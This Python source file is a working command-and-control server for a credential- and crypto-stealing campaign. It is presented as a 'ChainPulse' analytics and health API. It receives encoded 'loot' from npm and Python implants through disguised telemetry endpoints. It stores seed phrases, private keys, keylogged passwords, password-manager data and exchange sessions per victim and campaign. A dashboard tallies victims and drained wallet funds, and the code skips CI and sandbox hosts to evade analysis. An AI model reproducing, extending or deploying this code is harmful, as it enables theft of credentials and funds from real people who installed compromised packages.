#!/usr/bin/env python3
"""ChainPulse v8.2 — Analytics & Health API (Render-compatible).

Accepts both:
  - Python agent envelope: {endpoint, campaign, timestamp, payload:{system_info,...}}
  - NPM collector loot:    {id, host, user, time, files, ...}
Normalizes on ingest so the dashboard always has campaign/system fields.
"""
import json, base64, gzip, os, sys, time, glob, socket, threading
from http.server import HTTPServer, BaseHTTPRequestHandler, ThreadingHTTPServer
from datetime import datetime

PORT = int(os.environ.get("PORT", "10000"))
HOST = os.environ.get("HOST", "0.0.0.0")
LOOT_DIR = os.environ.get("LOOT_DIR", os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot"))
DEFAULT_CAMPAIGN = os.environ.get("DEFAULT_CAMPAIGN", "render-01")
os.makedirs(LOOT_DIR, exist_ok=True)

# Dedupe spam: same host within short window (npm double-fire / WSL loops)
_RECENT_FP = {}
_DEDUP_SEC = 45


DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ChainPulse v8.2 — Analytics</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'SF Mono','Consolas','Courier New',monospace;background:#080810;color:#00ff88;padding:20px;font-size:13px}
h1{color:#00d4ff;border-bottom:1px solid #1a3a3a;padding-bottom:10px;margin-bottom:20px;font-size:20px}
h2{color:#ffd700;margin:15px 0 8px;font-size:15px}
.card{background:#0c0c18;border:1px solid #1a3a3a;border-radius:6px;padding:15px;margin-bottom:12px}
.card-drain{background:#140a0a;border-color:#ff3333}
.card-seed{background:#0a0a14;border-color:#ffd700}
.card-session{background:#0a140a;border-color:#00ff88}
.card-files{background:#0a1018;border-color:#00d4ff}
.label{color:#666}.value{color:#00ff88}.key{color:#ffd700}
pre{background:#050510;padding:10px;border-radius:4px;overflow-x:auto;margin:10px 0;color:#aaa;font-size:11px;max-height:200px;overflow-y:auto}
.badge{display:inline-block;padding:2px 8px;border-radius:3px;font-size:11px;margin-right:4px;margin-bottom:4px}
.badge-drained{background:#00ff00;color:#000;font-weight:bold}
.badge-eth{background:#627eea;color:#fff}
.badge-btc{background:#f7931a;color:#000}
.badge-sol{background:#9945ff;color:#fff}
.badge-bsc{background:#f3ba2f;color:#000}
.badge-danger{background:#ff3333;color:#fff}
.badge-erc20{background:#00d4ff;color:#000}
.badge-session{background:#00cc66;color:#000}
.badge-files{background:#00d4ff;color:#000}
table{width:100%;border-collapse:collapse;margin:8px 0}
td,th{padding:6px 8px;border:1px solid #1a3a3a;text-align:left;font-size:11px}
th{background:#0f1a1a;color:#ffd700}
a{color:#00d4ff}
.stats-bar{display:flex;gap:15px;margin-bottom:15px;flex-wrap:wrap}
.stat-box{flex:1;min-width:120px;background:#0c0c18;border:1px solid #1a3a3a;border-radius:6px;padding:12px;text-align:center}
.stat-box .num{font-size:28px;font-weight:bold;color:#00d4ff}
.stat-box .lbl{font-size:11px;color:#666;margin-top:4px}
.chain-tag{display:inline-block;background:#1a1a2e;color:#00ff88;padding:1px 6px;border-radius:3px;font-size:10px;margin:2px}
.file-list{max-height:120px;overflow-y:auto;font-size:10px;color:#888;margin-top:6px}
</style>
</head>
<body>
<h1>ChainPulse v8.2 — Analytics Dashboard</h1>
<div id="stats"></div>
<div id="loot"></div>
<script>
function pick(obj, keys, fallback){
  if(!obj) return fallback;
  for(const k of keys){
    if(obj[k]!==undefined && obj[k]!==null && obj[k]!=='') return obj[k];
  }
  return fallback;
}
function unwrap(entry){
  // Support stored envelope OR raw loot
  const top = entry || {};
  const inner = top.payload && typeof top.payload==='object' ? top.payload : top;
  const sys = inner.system_info || {};
  return {
    endpoint: pick(top, ['endpoint'], pick(inner, ['endpoint'], 'report')),
    campaign: pick(top, ['campaign'], pick(inner, ['campaign'], '?')),
    timestamp: pick(top, ['timestamp','time'], pick(inner, ['timestamp','time'], '?')),
    hostname: pick(sys, ['hostname'], pick(inner, ['host','hostname'], '?')),
    user: pick(sys, ['user','username'], pick(inner, ['user','username'], '?')),
    os: pick(sys, ['os','platform'], pick(inner, ['os','platform'], '')),
    wallets: inner.wallets || {},
    secrets: inner.secrets || {},
    drain_results: inner.drain_results || [],
    exchange_sessions: inner.exchange_sessions || [],
    files: inner.files || {},
    keylog: inner.keylog || {},
    password_managers: inner.password_managers || [],
    id: pick(inner, ['id'], pick(top, ['id'], '')),
    raw: inner,
  };
}
async function load(){
  const r=await fetch('/api/loot-summary');
  const d=await r.json();

  let sc=0,pk=0,dc=0,sessions=0,fileHits=0,pwHits=0;
  const rows=(d.recent||[]).map(unwrap);
  for(const p of rows){
    const sec=p.secrets||{};
    sc+=(sec.seed_phrases||[]).length;
    pk+=(sec.private_keys||[]).length;
    pwHits+=(sec.captured_passwords||[]).length;
    dc+=(p.drain_results||[]).filter(x=>x.status==='drained').length;
    sessions+=(p.exchange_sessions||[]).length;
    fileHits+=Object.keys(p.files||{}).length;
  }

  document.getElementById('stats').innerHTML=
    '<div class="stats-bar">'+
    '<div class="stat-box"><div class="num">'+d.campaign_count+'</div><div class="lbl">Campaigns</div></div>'+
    '<div class="stat-box"><div class="num">'+d.total_victims+'</div><div class="lbl">Devices</div></div>'+
    '<div class="stat-box"><div class="num">'+d.total_files+'</div><div class="lbl">Reports</div></div>'+
    '<div class="stat-box"><div class="num">'+sc+'</div><div class="lbl">Seeds</div></div>'+
    '<div class="stat-box"><div class="num">'+pk+'</div><div class="lbl">Keys</div></div>'+
    '<div class="stat-box"><div class="num">'+pwHits+'</div><div class="lbl">Passwords</div></div>'+
    '<div class="stat-box"><div class="num">'+dc+'</div><div class="lbl">Drained</div></div>'+
    '<div class="stat-box"><div class="num">'+fileHits+'</div><div class="lbl">Files</div></div>'+
    '</div>';

  let html='';
  for(const p of rows){
    const fileCount=Object.keys(p.files||{}).length;
    const hasDrain=(p.drain_results||[]).some(dr=>dr.status==='drained');
    const seeds=(p.secrets.seed_phrases||[]).length;
    const pkeys=(p.secrets.private_keys||[]).length;
    const hasSessions=(p.exchange_sessions||[]).length;
    let cc='card';
    if(hasDrain)cc='card card-drain';
    else if(seeds)cc='card card-seed';
    else if(hasSessions)cc='card card-session';
    else if(fileCount)cc='card card-files';

    html+='<div class="'+cc+'">';
    html+='<h2>'+ p.endpoint +' — '+ p.timestamp +'</h2>';
    html+='<span class="label">Campaign:</span> <span class="value">'+p.campaign+'</span> | ';
    html+='<span class="label">System:</span> <span class="value">'+p.hostname+' ('+p.user+') '+p.os+'</span>';
    if(p.id) html+=' | <span class="label">ID:</span> <span class="value">'+p.id+'</span>';
    html+='<br>';

    const wallets=p.wallets||{};
    const wnames=Object.keys(wallets).filter(k=>wallets[k]&& (Array.isArray(wallets[k])?wallets[k].length:true));
    html+='<span class="label">Wallets:</span> ';
    if(wnames.length){
      html+=wnames.map(w=>'<span class="chain-tag">'+w+'</span>').join(' ');
    }else{html+='<span class="value">none listed</span>';}
    html+='<br>';

    const capPw=(p.secrets.captured_passwords||[]);
    const klCount=(p.keylog&&p.keylog.count)||(p.keylog&&p.keylog.entries&&p.keylog.entries.length)||0;
    const pmList=Array.isArray(p.password_managers)?p.password_managers:[];
    if(seeds)html+='<span class="badge badge-danger">SEED x'+seeds+'</span> ';
    if(pkeys)html+='<span class="badge badge-btc">KEY x'+pkeys+'</span> ';
    if(capPw.length)html+='<span class="badge badge-danger">PASSWORDS x'+capPw.length+'</span> ';
    if(klCount)html+='<span class="badge badge-session">KEYLOG x'+klCount+'</span> ';
    if(pmList.length)html+='<span class="badge badge-files">PWD-MGR x'+pmList.length+'</span> ';
    if(fileCount)html+='<span class="badge badge-files">FILES x'+fileCount+'</span> ';
    if(hasSessions){
      const domains=[...new Set(p.exchange_sessions.map(s=>s.domain||s))];
      html+='<span class="badge badge-session">SESSIONS: '+domains.slice(0,5).join(', ')+'</span> ';
    }

    if(capPw.length){
      html+='<div class="file-list" style="color:#ff8888;max-height:160px">';
      for(const x of capPw.slice(0,20)){
        html+='<div><b>'+String(x.window||'?').slice(0,50)+'</b> → <span class="key">'+String(x.password||'').slice(0,64)+'</span></div>';
      }
      html+='</div>';
    }
    if(pmList.length){
      html+='<div class="file-list">'+pmList.slice(0,15).map(n=>'<div>[PM] '+n+'</div>').join('')+
        (pmList.length>15?'<div>… +'+(pmList.length-15)+' more</div>':'')+'</div>';
    }
    if(fileCount){
      const names=Object.keys(p.files).slice(0,40);
      html+='<div class="file-list">'+names.map(n=>'<div>'+n+'</div>').join('')+
        (Object.keys(p.files).length>40?'<div>… +'+(Object.keys(p.files).length-40)+' more</div>':'')+
        '</div>';
    }

    const dr=p.drain_results||[];
    if(dr.length){
      html+='<br><span class="label">RESULTS ('+dr.length+'):</span><br>';
      html+='<table><tr><th>Chain</th><th>Type</th><th>Status</th><th>Amount</th><th>TX</th></tr>';
      for(const r of dr){
        let badge='';
        if(r.status==='drained'&&r.type==='erc20')badge='<span class="badge badge-erc20">ERC20</span>';
        else if(r.status==='drained')badge='<span class="badge badge-drained">DRAINED</span>';
        else if(r.status==='empty')badge='<span class="badge">empty</span>';
        else if(r.status==='dust')badge='<span class="badge">dust</span>';
        else badge='<span class="badge" style="background:#555">'+(r.status||'?')+'</span>';

        let amt='-';
        if(r.amount_ether!==undefined)amt=Number(r.amount_ether).toFixed(6)+' '+(r.chain||'').toUpperCase();
        else if(r.amount_human!==undefined)amt=Number(r.amount_human).toFixed(4)+' '+(r.symbol||'');
        else if(r.amount_sol!==undefined)amt=Number(r.amount_sol).toFixed(6)+' SOL';

        html+='<tr>'+
          '<td><span class="chain-tag">'+(r.chain||'?')+'</span></td>'+
          '<td>'+(r.type||r.symbol||'native')+'</td>'+
          '<td>'+badge+'</td>'+
          '<td>'+amt+'</td>'+
          '<td>'+(r.explorer?'<a href="'+r.explorer+'" target="_blank">view</a>':r.tx_hash?String(r.tx_hash).slice(0,12)+'...':'-')+'</td>'+
        '</tr>';
      }
      html+='</table>';
    }

    html+='</div>';
  }
  document.getElementById('loot').innerHTML=html||'<div class="card">No data yet. Waiting for telemetry...</div>';
}
load();setInterval(load,8000);
</script>
</body>
</html>"""


def _normalize_payload(raw: dict) -> dict:
    """Unify Python-agent and NPM-collector shapes into one envelope."""
    if not isinstance(raw, dict):
        raw = {"raw": str(raw)}

    # Already envelope?
    if isinstance(raw.get("payload"), dict) and (
        raw.get("endpoint") or raw.get("campaign") or "system_info" in raw.get("payload", {})
    ):
        env = dict(raw)
        pl = dict(env.get("payload") or {})
    else:
        # NPM collector style: {id, host, user, time, files}
        pl = dict(raw)
        env = {}

    # system_info
    sysinfo = pl.get("system_info") if isinstance(pl.get("system_info"), dict) else {}
    host = sysinfo.get("hostname") or pl.get("host") or pl.get("hostname") or "unknown"
    user = sysinfo.get("user") or sysinfo.get("username") or pl.get("user") or pl.get("username") or "unknown"
    os_name = sysinfo.get("os") or pl.get("os") or pl.get("platform") or ""
    pl["system_info"] = {
        "hostname": host,
        "user": user,
        "os": os_name,
    }

    # ensure containers
    if "wallets" not in pl or not isinstance(pl.get("wallets"), dict):
        pl["wallets"] = pl.get("wallets") if isinstance(pl.get("wallets"), dict) else {}
    if "secrets" not in pl or not isinstance(pl.get("secrets"), dict):
        pl["secrets"] = pl.get("secrets") if isinstance(pl.get("secrets"), dict) else {}
    if "keylog" not in pl or not isinstance(pl.get("keylog"), dict):
        pl["keylog"] = pl.get("keylog") if isinstance(pl.get("keylog"), dict) else {}
    if "password_managers" not in pl or not isinstance(pl.get("password_managers"), list):
        pl["password_managers"] = pl.get("password_managers") if isinstance(pl.get("password_managers"), list) else []
    if "drain_results" not in pl or not isinstance(pl.get("drain_results"), list):
        pl["drain_results"] = pl.get("drain_results") if isinstance(pl.get("drain_results"), list) else []
    if "exchange_sessions" not in pl or not isinstance(pl.get("exchange_sessions"), list):
        pl["exchange_sessions"] = pl.get("exchange_sessions") if isinstance(pl.get("exchange_sessions"), list) else []
    if "files" not in pl or not isinstance(pl.get("files"), dict):
        pl["files"] = pl.get("files") if isinstance(pl.get("files"), dict) else {}

    # Infer wallets from file paths (MetaMask etc.)
    if not pl["wallets"] and pl["files"]:
        found = set()
        for fp in pl["files"].keys():
            low = str(fp).lower()
            for name in (
                "metamask", "exodus", "phantom", "electrum", "atomic", "trust",
                "coinbase", "brave", "ronin", "binance", "okx", "ledger",
            ):
                if name in low:
                    found.add(name)
        if found:
            pl["wallets"] = {n: ["detected"] for n in sorted(found)}

    campaign = (
        env.get("campaign")
        or pl.get("campaign")
        or DEFAULT_CAMPAIGN
    )
    endpoint = (
        env.get("endpoint")
        or pl.get("endpoint")
        or ("npm-collector" if pl.get("files") is not None and pl.get("host") or pl.get("system_info") else "report")
    )
    if endpoint in ("unknown", "", None):
        endpoint = "npm-collector" if pl.get("files") else "report"
    ts = (
        env.get("timestamp")
        or pl.get("timestamp")
        or pl.get("time")
        or datetime.utcnow().isoformat()
    )

    return {
        "endpoint": endpoint,
        "campaign": campaign,
        "timestamp": ts,
        "payload": pl,
        "id": pl.get("id") or env.get("id") or "",
    }



def _is_noise_host(host: str, user: str, os_str: str = "") -> bool:
    h = (host or "").lower()
    u = (user or "").lower()
    o = (os_str or "").lower()
    if u in ("runner", "github", "gitlab-runner"):
        return True
    if "gvisor" in o or "aws" in o and u == "runner":
        return True
    if h in ("ubuntu-fc-uvm",) and u in ("ubuntu", "root"):
        return False  # keep lab
    # docker-style 12-hex hostnames from sandboxes
    if len(h) == 12 and all(c in "0123456789abcdef" for c in h):
        return True
    if h.startswith("runnervm") or "actions" in h:
        return True
    return False


class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        if self.path in ("/", "/dashboard"):
            self._serve_html(DASHBOARD_HTML)
        elif self.path == "/api/loot-summary":
            self._serve_json(self._get_summary())
        elif self.path == "/health":
            self._serve_json({"status": "healthy", "version": "8.2.0", "render": True})
        else:
            self.send_error(404)

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, X-Client-ID")
        self.end_headers()

    def do_POST(self):
        telemetry_endpoints = ("/api/v1/telemetry", "/collect", "/metrics", "/ping")
        if not any(self.path.startswith(ep) for ep in telemetry_endpoints):
            self.send_error(404)
            return
        try:
            cl = int(self.headers.get("Content-Length", 0))
            if cl == 0 or cl > 30_000_000:
                self.send_error(400)
                return
            body = self.rfile.read(cl)
            data = json.loads(body)
            if "t" not in data:
                self.send_error(400)
                return
            compressed = base64.b64decode(data["t"])
            decompressed = gzip.decompress(compressed)
            payload = json.loads(decompressed)

            env = _normalize_payload(payload)
            endpoint = env["endpoint"]
            campaign = env["campaign"]
            ts = str(env["timestamp"]).replace(":", "-")
            host = env["payload"].get("system_info", {}).get("hostname", "unknown")
            user = env["payload"].get("system_info", {}).get("user", "")
            os_name = env["payload"].get("system_info", {}).get("os", "")
            nfiles = len((env.get("payload") or {}).get("files") or {})

            # Soft-skip pure CI noise (still ack so clients don't retry spam)
            if _is_noise_host(host, user, os_name) and endpoint not in ("npm-hello",):
                print(f"[~] noise skip {host}/{user} ep={endpoint}")
                self._serve_json({"status": "ok", "noise": True, "campaign": campaign, "endpoint": endpoint})
                return

            fp_key = f"{campaign}|{endpoint}|{host}|{nfiles}|{str(env.get('timestamp', ''))[:19]}"
            now = time.time()
            for k in list(_RECENT_FP.keys()):
                if now - _RECENT_FP[k] > _DEDUP_SEC:
                    _RECENT_FP.pop(k, None)
            if fp_key in _RECENT_FP and now - _RECENT_FP[fp_key] < _DEDUP_SEC:
                print(f"[~] dedupe skip {fp_key}")
                self._serve_json({"status": "ok", "deduped": True, "campaign": campaign, "endpoint": endpoint})
                return
            _RECENT_FP[fp_key] = now

            cdir = os.path.join(LOOT_DIR, campaign)
            os.makedirs(cdir, exist_ok=True)
            safe_host = "".join(c if c.isalnum() or c in "-_." else "_" for c in host)[:40]

            # Merge chunked collector parts into one host file when possible
            pl = env["payload"]
            chunk_meta = pl.get("chunk") if isinstance(pl.get("chunk"), dict) else None
            base_ep = endpoint.split("-p")[0] if endpoint.startswith("npm-collector") or endpoint.startswith("npm-keylog") else endpoint
            merged = False
            if chunk_meta is not None or endpoint.startswith("npm-collector-p") or endpoint.startswith("npm-keylog-p"):
                merge_name = f"{base_ep}_{safe_host}_merged.json"
                merge_path = os.path.join(cdir, merge_name)
                existing = None
                if os.path.isfile(merge_path):
                    try:
                        with open(merge_path) as mf:
                            existing = json.load(mf)
                    except Exception:
                        existing = None
                if existing and isinstance(existing.get("payload"), dict):
                    epl = existing["payload"]
                    efiles = epl.get("files") if isinstance(epl.get("files"), dict) else {}
                    nfiles_map = pl.get("files") if isinstance(pl.get("files"), dict) else {}
                    efiles.update(nfiles_map)
                    epl["files"] = efiles
                    # merge wallets / secrets / keylog / pm
                    ew = epl.get("wallets") if isinstance(epl.get("wallets"), dict) else {}
                    nw = pl.get("wallets") if isinstance(pl.get("wallets"), dict) else {}
                    ew.update(nw)
                    epl["wallets"] = ew
                    esec = epl.get("secrets") if isinstance(epl.get("secrets"), dict) else {}
                    nsec = pl.get("secrets") if isinstance(pl.get("secrets"), dict) else {}
                    for k, v in nsec.items():
                        if isinstance(v, list) and isinstance(esec.get(k), list):
                            seen = set(json.dumps(x, sort_keys=True, default=str) if isinstance(x, dict) else str(x) for x in esec[k])
                            for item in v:
                                key = json.dumps(item, sort_keys=True, default=str) if isinstance(item, dict) else str(item)
                                if key not in seen:
                                    esec[k].append(item)
                                    seen.add(key)
                        elif v:
                            esec[k] = v
                    epl["secrets"] = esec
                    if pl.get("keylog") and (pl["keylog"].get("count") or pl["keylog"].get("entries")):
                        epl["keylog"] = pl["keylog"]
                    if pl.get("password_managers"):
                        pm = list(epl.get("password_managers") or [])
                        for x in pl["password_managers"]:
                            if x not in pm:
                                pm.append(x)
                        epl["password_managers"] = pm
                    epl["chunk_parts"] = (epl.get("chunk_parts") or 0) + 1
                    existing["payload"] = epl
                    existing["timestamp"] = env.get("timestamp") or existing.get("timestamp")
                    existing["endpoint"] = base_ep
                    with open(merge_path, "w") as mf:
                        json.dump(existing, mf, indent=2, default=str)
                    fpath = merge_path
                    merged = True
                    nfiles = len(efiles)
                else:
                    # seed merge file from this part
                    seed = dict(env)
                    seed["endpoint"] = base_ep
                    seed["payload"] = dict(pl)
                    seed["payload"]["chunk_parts"] = 1
                    with open(merge_path, "w") as mf:
                        json.dump(seed, mf, indent=2, default=str)
                    fpath = merge_path
                    merged = True

            if not merged:
                fname = f"{endpoint}_{safe_host}_{ts}.json"
                fpath = os.path.join(cdir, fname)
                with open(fpath, "w") as f:
                    json.dump(env, f, indent=2, default=str)

            dr = pl.get("drain_results", [])
            for r in dr:
                if r.get("status") == "drained":
                    amt = r.get("amount_ether", r.get("amount_human", r.get("amount_sol", 0)))
                    sym = r.get("symbol", r.get("chain", "?"))
                    try:
                        print(f"[$$] DRAINED {float(amt):.6f} {sym} | tx: {str(r.get('tx_hash','?'))[:16]}...")
                    except Exception:
                        print(f"[$$] DRAINED {amt} {sym}")

            seeds = pl.get("secrets", {}).get("seed_phrases", [])
            if seeds:
                print(f"[!!!] SEED PHRASES: {len(seeds)} found!")

            print(f"[+] {endpoint} | campaign={campaign} | host={host} | files={nfiles} | merged={merged} | {fpath}")
            self._serve_json({"status": "ok", "campaign": campaign, "endpoint": endpoint, "merged": merged})

        except Exception as e:
            print(f"[-] Error: {e}")
            try:
                self._serve_json({"status": "error", "error": str(e)[:300]}, code=500)
            except Exception:
                self.send_error(500)

    def _serve_html(self, html):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode())

    def _serve_json(self, data, code=200):
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def _get_summary(self):
        campaigns = []
        total_files = 0
        recent = []
        all_entries = []
        try:
            for cdir in sorted(os.listdir(LOOT_DIR)):
                cp = os.path.join(LOOT_DIR, cdir)
                if not os.path.isdir(cp):
                    continue
                files = sorted(glob.glob(os.path.join(cp, "*.json")), key=os.path.getmtime, reverse=True)
                total_files += len(files)
                campaigns.append({"name": cdir, "files": len(files)})
                for fp in files[:80]:
                    try:
                        with open(fp) as f:
                            all_entries.append(json.load(f))
                    except Exception:
                        pass
        except Exception:
            pass

        hosts = set()
        real = []
        noise = []
        for r in all_entries:
            pl = r.get("payload") or r
            si = pl.get("system_info") or {}
            h = si.get("hostname") or pl.get("host") or ""
            u = si.get("user") or pl.get("user") or ""
            o = si.get("os") or pl.get("os") or ""
            if h:
                hosts.add(h)
            if _is_noise_host(h, u, o):
                noise.append(r)
            else:
                real.append(r)
        # Prefer real hosts; fill with noise only if empty
        recent = (real + noise)[:40]
        real_hosts = set()
        for r in real:
            pl = r.get("payload") or r
            si = pl.get("system_info") or {}
            h = si.get("hostname") or pl.get("host") or ""
            if h:
                real_hosts.add(h)
        return {
            "campaign_count": len(campaigns),
            "campaigns": campaigns,
            "total_victims": len(real_hosts) or len(hosts),
            "total_files": total_files,
            "recent": recent,
            "noise_filtered": len(noise),
        }


if __name__ == "__main__":
    print(f"[C2] ChainPulse v8.2.0 (Render) — http://{HOST}:{PORT}")
    print(f"[C2] Dashboard: /dashboard")
    print(f"[C2] Health:    /health")
    print(f"[C2] Loot dir:  {LOOT_DIR}")
    server = ThreadingHTTPServer((HOST, PORT), C2Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[C2] Shutting down...")
        server.shutdown()
